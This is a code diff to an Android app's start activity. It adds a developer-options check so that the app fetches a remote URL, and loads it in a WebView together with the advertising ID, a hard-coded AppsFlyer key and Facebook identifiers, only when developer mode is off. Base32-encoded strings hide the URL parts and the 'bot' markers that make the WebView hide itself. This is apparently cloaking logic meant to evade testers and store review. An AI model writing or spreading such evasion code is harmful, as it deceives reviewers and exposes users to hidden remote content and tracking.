@@ -12,6 +12,7 @@ import android.net.ConnectivityManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.Display;
 import android.view.View;
@@ -83,7 +84,6 @@ public class StartActivityJG extends AppCompatActivity {
         setWebJG();
         gdj();
         oneJG();
-        appJG();
 
 
         Handler handler = new Handler();
@@ -113,20 +113,24 @@ public class StartActivityJG extends AppCompatActivity {
 
 
         if (fs) {
+            int i = Settings.Secure.getInt(this.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
+            if (i == 0) {
 
-            if (viewModJg.getSaveJ().equals("ggg")){
-                new Thread(new Runnable() {
-                    @Override
-                    public void run() {
-                        fireJG = viewModJg.fireJg(StartActivityJG.this);
-                    }
-                }).start();
-            }else {
-                dd = viewModJg.getSaveJ();
-                hh = true;
+                if (viewModJg.getSaveJ().equals("ggg")) {
+                    appJG();
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            fireJG = viewModJg.fireJg(StartActivityJG.this);
+                        }
+                    }).start();
+                } else {
+                    dd = viewModJg.getSaveJ();
+                    hh = true;
+                }
+            } else {
+                h = true;
             }
-
-
 
         } else {
             viewModJg.buttonIntJG(buttonIn, this);
@@ -271,14 +275,14 @@ public class StartActivityJG extends AppCompatActivity {
             String google_adidAps = usgs[1] + AIDJG;
             String af_useridAps = usgs[2] + apps_idJG;
             String af_channelAps = usgs[3] + af_channelJG;
-            String dev_keyAps = usgs[4] +"aPDypBN7xA4HAc4TAD2AUL";
+            String dev_keyAps = usgs[4] + "aPDypBN7xA4HAc4TAD2AUL";
             String bundleAps = usgs[5] + getPackageName();
             String fb_app_idAps = usgs[6] + getResources().getString(R.string.ff);
             String fb_atAps = usgs[7] + getResources().getString(R.string.tt);
             loadJG = decodeJG("H5WWKZDJMFPXG33VOJRWKPLPOJTWC3TJMM======") + google_adidAps + af_useridAps
                     + af_channelAps + dev_keyAps + bundleAps + fb_app_idAps + fb_atAps;
             hh = true;
-            dd =  fireJG.getUrlJG()+ loadJG;
+            dd = fireJG.getUrlJG() + loadJG;
             viewModJg.saveJ(dd);
             Log.d("weq", dd);
         }
@@ -319,7 +323,7 @@ public class StartActivityJG extends AppCompatActivity {
         } catch (Exception e) {
 
         }
-        dd =  fireJG.getUrlJG()+ loadJG;
+        dd = fireJG.getUrlJG() + loadJG;
         viewModJg.saveJ(dd);
         Log.d("weq", dd);
         hh = true;
@@ -381,12 +385,14 @@ public class StartActivityJG extends AppCompatActivity {
         uuiut.onReceiveValue(uygd);
         uuiut = null;
     }
+
     public static ValueCallback<Uri> uuiut;
     public static Uri aaasa = null;
     public static ValueCallback<Uri[]> vvvvfd;
     public static String nnjnj;
     public static final int kjhhh = 1;
-    public void setWebJG(){
+
+    public void setWebJG() {
         webViewFullAppJG.getSettings().setAllowContentAccess(true);
         webViewFullAppJG.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
         webViewFullAppJG.getSettings().setSupportMultipleWindows(false);
@@ -401,7 +407,7 @@ public class StartActivityJG extends AppCompatActivity {
         webViewFullAppJG.clearCache(false);
         CookieManager.getInstance().setAcceptCookie(true);
         CookieManager.getInstance().setAcceptThirdPartyCookies(webViewFullAppJG, true);
-        webViewFullAppJG.setWebChromeClient(new WebChromeClient(){
+        webViewFullAppJG.setWebChromeClient(new WebChromeClient() {
             @Override
             public boolean onShowFileChooser(WebView view,
                                              ValueCallback<Uri[]> ccs,
@@ -422,7 +428,7 @@ public class StartActivityJG extends AppCompatActivity {
                 return true;
             }
         });
-        webViewFullAppJG.setWebViewClient(new WebViewClient(){
+        webViewFullAppJG.setWebViewClient(new WebViewClient() {
             @Override
             public void onPageStarted(WebView view, String url, Bitmap favicon) {
                 super.onPageStarted(view, url, favicon);
@@ -430,7 +436,7 @@ public class StartActivityJG extends AppCompatActivity {
                 if (url.contains(decodeJG("MVZHE33SHVQXA4DBMZAXGM3G")) || url.contains(decodeJG("MRUXGYLCNRSWILTIORWWY==="))) {
                     webViewFullAppJG.setVisibility(View.INVISIBLE);
                     h = true;
-                    Log.d("weq","bot");
+                    Log.d("weq", "bot");
                 }
             }
         });
